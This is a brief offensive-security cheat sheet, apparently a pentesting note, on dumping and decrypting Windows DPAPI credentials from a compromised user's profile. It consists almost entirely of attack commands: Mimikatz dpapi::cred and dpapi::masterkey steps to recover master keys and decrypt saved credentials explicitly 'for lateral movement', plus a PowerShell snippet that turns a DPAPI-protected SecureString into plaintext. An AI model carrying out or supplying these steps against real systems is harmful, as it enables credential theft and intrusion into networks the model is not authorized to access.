# DPAPI Credentials Dumping and Decrypting

### Steps:

## 1) Enumerate the credentials folders of our compromised user:

    Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Credentials\ (If true positive, you should see some numeric values like: 84F1CAEEBF466550F4967858F9353FB4 as an example)

## 2) Transfer and run Mimikatz to check more details of the credentials we found

    mimikatz# dpapi::cred /in:C:\Users\USER\AppData\Roaming\Microsoft\credentials\XXXXXXXXXXX (From all the data we dumped, we need THE GUID MASTERKEY for now)

## 3) Find the SID number of our compromised user

    C:\Users\USER\appdata\roaming\microsoft\protect

    dir

## 4) Change the SID and GUID MASTERKEY to your own

    mimikatz# dpapi::masterkey /in:C:\Users\USER\appdata\roaming\microsoft\protect\SID\GUID_MASTERKEY /rpc

## 5) Decrypt the credentials for lateral movement

    dpapi::cred /in:C:\Users\USER\AppData\Roaming\Microsoft\credentials\XXXXXXXXXXXXX /guidMasterkey::GUID_MASTERKEY

### Alternate scenario: DPAPI Encrypted blob detected

## 1) Add the blob to a text file

    echo 'DPAPI_BLOB' > creds.txt

## 2) Decrypt creds

    $pw = Get-Content .creds.txt | ConvertTo-SecureString
    $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)
    $UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
    $UnsecurePassword
